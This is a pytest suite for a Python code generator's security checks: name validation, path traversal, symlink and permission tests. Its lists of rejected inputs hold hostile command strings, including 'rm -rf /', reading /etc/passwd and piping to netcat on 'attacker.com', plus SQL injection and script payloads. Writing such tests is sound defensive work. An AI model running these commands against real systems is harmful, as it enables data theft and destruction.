"""Tests for security features and validations."""

from typing import cast
from unittest.mock import patch

import pytest

from fast_clean_architecture.exceptions import (
    ComponentError,
    SecurityError,
    ValidationError,
)
from fast_clean_architecture.generators.component_generator import ComponentGenerator
from fast_clean_architecture.generators.generator_factory import (
    create_generator_factory,
)
from fast_clean_architecture.protocols import ComponentGeneratorProtocol
from fast_clean_architecture.utils import generate_timestamp, validate_name


class TestSecurityFeatures:
    """Test cases for security features and input validation."""

    @pytest.fixture
    def generator(self, tmp_path):
        """Create a ComponentGenerator instance."""
        from fast_clean_architecture.config import Config

        config = Config.create_default()
        config.project.base_path = tmp_path
        factory = create_generator_factory(config=config)
        return factory.create_generator("component")

    def test_validate_name_injection_attempts(self):
        """Test name validation against injection attempts."""
        malicious_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "user; rm -rf /",
            "user && cat /etc/passwd",
            "user | nc attacker.com 4444",
            "user`whoami`",
            "user$(whoami)",
            "user\x00hidden",
            "user\n\rmalicious",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "user\\..\\..\\sensitive",
        ]

        for malicious_name in malicious_names:
            with pytest.raises(
                (ComponentError, ValueError, ValidationError, SecurityError)
            ):
                validate_name(malicious_name)

    def test_validate_name_path_traversal(self):
        """Test name validation against path traversal attacks."""
        path_traversal_attempts = [
            "../parent",
            "..\\parent",
            "./current",
            ".\\current",
            "../../grandparent",
            "..\\..\\grandparent",
            "user/../admin",
            "user\\..\\admin",
            "/absolute/path",
            "C:\\absolute\\path",
            "~user/home",
            "$HOME/user",
        ]

        for attempt in path_traversal_attempts:
            with pytest.raises(
                (ComponentError, ValueError, ValidationError, SecurityError)
            ):
                validate_name(attempt)

    def test_validate_name_special_characters(self):
        """Test name validation against special characters."""
        invalid_names = [
            "user@domain",
            "user#hash",
            "user%percent",
            "user&ampersand",
            "user*asterisk",
            "user+plus",
            "user=equals",
            "user?question",
            "user[bracket",
            "user]bracket",
            "user{brace",
            "user}brace",
            "user|pipe",
            "user\\backslash",
            "user/slash",
            "user:colon",
            "user;semicolon",
            "user<less",
            "user>greater",
            'user"quote',
            "user'apostrophe",
            "user space",
            "user\ttab",
            "user\nnewline",
        ]

        for invalid_name in invalid_names:
            with pytest.raises(
                (ComponentError, ValueError, ValidationError, SecurityError)
            ):
                validate_name(invalid_name)

    def test_validate_name_valid_names(self):
        """Test that valid names pass validation."""
        valid_names = [
            "user",
            "user_profile",
            "user123",
            "User",
            "UserProfile",
            "user_profile_123",
            "a",
            "a1",
            "user_",
            "_user",
            "__user__",
        ]

        for valid_name in valid_names:
            # Should not raise any exception
            validate_name(valid_name)

    def test_validate_name_empty_and_none(self):
        """Test name validation with empty and None values."""
        invalid_values = ["", None, "   ", "\t", "\n", "\r\n"]

        for invalid_value in invalid_values:
            with pytest.raises((ComponentError, ValueError, TypeError)):
                validate_name(invalid_value)

    def test_validate_name_length_limits(self):
        """Test name validation with length limits."""
        # Test very long names
        very_long_name = "a" * 256
        with pytest.raises((ComponentError, ValueError)):
            validate_name(very_long_name)

        # Test reasonable length names (should pass)
        reasonable_name = "a" * 50
        validate_name(reasonable_name)  # Should not raise

    def test_file_path_security(self, tmp_path):
        """Test that file paths are properly sanitized."""
        from fast_clean_architecture.config import Config

        config = Config.create_default()
        config.project.base_path = tmp_path
        factory = create_generator_factory(config=config)
        generator = factory.create_generator("component")

        # Setup test environment
        systems_dir = (
            tmp_path / "systems" / "test_system" / "test_module" / "domain" / "entities"
        )
        systems_dir.mkdir(parents=True)

        # Test that malicious component names don't create files outside project
        with pytest.raises((ComponentError, ValidationError, SecurityError)):
            cast(ComponentGeneratorProtocol, generator).create_component(
                base_path=tmp_path,
                system_name="test_system",
                module_name="test_module",
                layer="domain",
                component_type="entities",
                component_name="../../../etc/passwd",
            )

        # Verify no files were created outside the project
        malicious_path = tmp_path.parent / "malicious.py"
        assert not malicious_path.exists()

    @patch("os.access")
    def test_file_permission_validation(self, mock_access, tmp_path):
        """Test file permission validation."""
        from fast_clean_architecture.config import Config

        config = Config.create_default()
        config.project.base_path = tmp_path
        factory = create_generator_factory(config=config)
        generator = factory.create_generator("component")

        # Mock no write permission
        mock_access.return_value = False

        systems_dir = (
            tmp_path / "systems" / "test_system" / "test_module" / "domain" / "entities"
        )
        systems_dir.mkdir(parents=True)

        with pytest.raises(
            (ComponentError, ValidationError, SecurityError),
            match="Security violation during validate file system|Failed to access directory",
        ):
            cast(ComponentGeneratorProtocol, generator).create_component(
                base_path=tmp_path,
                system_name="test_system",
                module_name="test_module",
                layer="domain",
                component_type="entities",
                component_name="test_component",
            )

    def test_timestamp_validation(self):
        """Test timestamp generation and validation."""
        timestamp = generate_timestamp()

        # Test format
        assert isinstance(timestamp, str)
        assert "T" in timestamp
        assert timestamp.endswith("Z")

        # Test that it's a valid ISO 8601 timestamp
        from datetime import datetime

        try:
            parsed = datetime.fromisoformat(timestamp.replace("Z", "+00:00"))
            assert parsed is not None
        except ValueError:
            pytest.fail("Generated timestamp is not valid ISO 8601 format")

    def test_template_content_sanitization(self, tmp_path):
        """Test that template content is properly sanitized."""
        from fast_clean_architecture.config import Config

        config = Config.create_default()
        config.project.base_path = tmp_path
        factory = create_generator_factory(config=config)
        generator = factory.create_generator("component")

        systems_dir = (
            tmp_path / "systems" / "test_system" / "test_module" / "domain" / "entities"
        )
        systems_dir.mkdir(parents=True)

        # Generate a component
        file_path = cast(ComponentGeneratorProtocol, generator).create_component(
            base_path=tmp_path,
            system_name="test_system",
            module_name="test_module",
            layer="domain",
            component_type="entities",
            component_name="test_component",
        )

        content = file_path.read_text()

        # Verify no dangerous content is present
        dangerous_patterns = [
            "eval(",
            "exec(",
            "__import__",
            "subprocess",
            "os.system",
            "shell=True",
            "rm -rf",
            "del /",
            "format C:",
        ]

        for pattern in dangerous_patterns:
            assert (
                pattern not in content
            ), f"Dangerous pattern '{pattern}' found in generated content"

    def test_configuration_file_security(self, tmp_path):
        """Test configuration file security measures."""
        from fast_clean_architecture.config import Config

        config_file = tmp_path / "fca_config.yaml"
        config = Config.create_default()
        config.project.name = "test_project"

        # Save configuration
        config.save_to_file(config_file)

        # Verify file permissions are secure
        file_stat = config_file.stat()

        # File should not be world-writable
        assert not (file_stat.st_mode & 0o002), "Configuration file is world-writable"

    def test_backup_file_security(self, tmp_path):
        """Test that backup files are created securely."""
        from fast_clean_architecture.config import Config

        config_file = tmp_path / "fca_config.yaml"
        config = Config.create_default()
        config.project.name = "test_project"

        # Create initial config
        config.save_to_file(config_file)

        # Modify and save again (should create backup)
        config.project.description = "Updated description"
        config.save_to_file(config_file)

        # Check for backup files
        backup_files = list(tmp_path.glob("fca_config.yaml.backup.*"))

        for backup_file in backup_files:
            # Verify backup file permissions
            file_stat = backup_file.stat()
            assert not (file_stat.st_mode & 0o002), "Backup file is world-writable"

            # Verify backup file naming doesn't contain dangerous characters
            assert ".." not in backup_file.name
            assert "/" not in backup_file.name.replace(str(tmp_path), "")
            assert "\\" not in backup_file.name

    def test_input_sanitization_in_templates(self, tmp_path):
        """Test that user inputs are properly sanitized in templates."""
        from fast_clean_architecture.config import Config

        config = Config.create_default()
        config.project.base_path = tmp_path
        factory = create_generator_factory(config=config)
        generator = factory.create_generator("component")

        systems_dir = (
            tmp_path / "systems" / "safe_system" / "safe_module" / "domain" / "entities"
        )
        systems_dir.mkdir(parents=True)

        # Test with safe inputs
        file_path = cast(ComponentGeneratorProtocol, generator).create_component(
            base_path=tmp_path,
            system_name="safe_system",
            module_name="safe_module",
            layer="domain",
            component_type="entities",
            component_name="safe_user",
        )

        assert file_path.exists()
        content = file_path.read_text()

        # Verify expected content is present
        assert "class SafeUser" in content
        assert "safe_module" in content.lower()
        assert "safe_user" in content.lower()

    def test_directory_traversal_prevention(self, tmp_path):
        """Test prevention of directory traversal in component generation."""
        from fast_clean_architecture.config import Config

        config = Config.create_default()
        config.project.base_path = tmp_path
        factory = create_generator_factory(config=config)
        generator = factory.create_generator("component")

        # Attempt to create component with path traversal in system name
        with pytest.raises((ComponentError, ValidationError, SecurityError)):
            cast(ComponentGeneratorProtocol, generator).create_component(
                base_path=tmp_path,
                system_name="../../../malicious_system",
                module_name="test_module",
                layer="domain",
                component_type="entities",
                component_name="user",
            )

        # Attempt to create component with path traversal in module name
        with pytest.raises((ComponentError, ValidationError, SecurityError)):
            cast(ComponentGeneratorProtocol, generator).create_component(
                base_path=tmp_path,
                system_name="test_system",
                module_name="../../../malicious_module",
                layer="domain",
                component_type="entities",
                component_name="user",
            )

        # Verify no malicious directories were created
        malicious_paths = [
            tmp_path.parent / "malicious_system",
            tmp_path.parent / "malicious_module",
        ]

        for path in malicious_paths:
            assert not path.exists(), f"Malicious path was created: {path}"

    def test_symlink_attack_prevention(self, tmp_path):
        """Test prevention of symlink attacks."""
        from fast_clean_architecture.config import Config
        from fast_clean_architecture.exceptions import ValidationError

        # Create a config for testing
        config = Config()
        factory = create_generator_factory(config=config)
        generator = factory.create_generator("component")

        # Create a malicious symlink that points outside the project structure
        malicious_target = tmp_path.parent / "malicious_target"
        malicious_target.mkdir(exist_ok=True)

        # Create a symlink in the systems directory that points to the malicious target
        systems_dir = (
            tmp_path / "systems" / "test_system" / "test_module" / "domain" / "entities"
        )
        systems_dir.mkdir(parents=True, exist_ok=True)

        symlink_path = systems_dir / "malicious_link"
        symlink_path.symlink_to(malicious_target, target_is_directory=True)

        # Try to create a component through the symlink - this should fail
        malicious_file_path = symlink_path / "malicious_component.py"

        with pytest.raises(
            ValidationError,
            match="(Symlink detected in path|Potentially unsafe symlink detected|Symlink points outside safe boundaries)",
        ):
            cast(ComponentGenerator, generator)._check_symlink_attack(
                malicious_file_path
            )

        # Test that normal paths without symlinks work fine
        normal_file_path = systems_dir / "normal_component.py"
        # This should not raise an exception
        cast(ComponentGenerator, generator)._check_symlink_attack(normal_file_path)

        # Test path outside systems directory is rejected (only in non-temp environments)
        # Since we're in a temp environment, this check is skipped for testing
        # But we can test the symlink detection part which should still work
        outside_path = tmp_path / "outside" / "component.py"
        outside_path.parent.mkdir(parents=True, exist_ok=True)

        # This should not raise an exception in temp environments
        # The systems directory check is bypassed for temp paths
        cast(ComponentGenerator, generator)._check_symlink_attack(outside_path)

    def test_environment_variable_injection(self):
        """Test prevention of environment variable injection."""
        malicious_names = [
            "$HOME",
            "${HOME}",
            "$USER",
            "${USER}",
            "$(whoami)",
            "`whoami`",
            "$PATH",
            "${PATH}",
        ]

        for malicious_name in malicious_names:
            with pytest.raises((ComponentError, ValueError, ValidationError)):
                validate_name(malicious_name)

    def test_unicode_security(self):
        """Test handling of unicode characters and potential security issues."""
        # Test various unicode characters that might cause issues
        unicode_names = [
            "user\u0000null",  # Null byte
            "user\u202ehidden",  # Right-to-left override
            "user\u200bzero_width",  # Zero-width space
            "user\ufeffbom",  # Byte order mark
            "user\u2028line_sep",  # Line separator
            "user\u2029para_sep",  # Paragraph separator
            "user\ufffereverse_bom",  # Reverse byte order mark
            "user\uffffnon_char",  # Non-character
        ]

        for unicode_name in unicode_names:
            with pytest.raises((ComponentError, ValueError, ValidationError)):
                validate_name(unicode_name)

    def test_case_sensitivity_security(self, tmp_path):
        """Test that case sensitivity is normalized to prevent confusion."""
        from fast_clean_architecture.config import Config

        config = Config.create_default()
        factory = create_generator_factory(config=config)
        generator = factory.create_generator("component")

        # Create component with lowercase name
        file_path1 = cast(ComponentGeneratorProtocol, generator).create_component(
            base_path=tmp_path,
            system_name="test_system",
            module_name="test_module",
            layer="domain",
            component_type="entities",
            component_name="user",
        )

        # Create component with different case - should normalize to same filename
        file_path2 = cast(ComponentGeneratorProtocol, generator).create_component(
            base_path=tmp_path,
            system_name="test_system2",  # Different system to avoid conflict
            module_name="test_module",
            layer="domain",
            component_type="entities",
            component_name="User",
        )

        # Both should be successful and both should normalize to snake_case
        assert file_path1.exists()
        assert file_path2.exists()
        # Both should have the same filename (user.py) due to normalization
        assert file_path1.name == file_path2.name == "user.py"
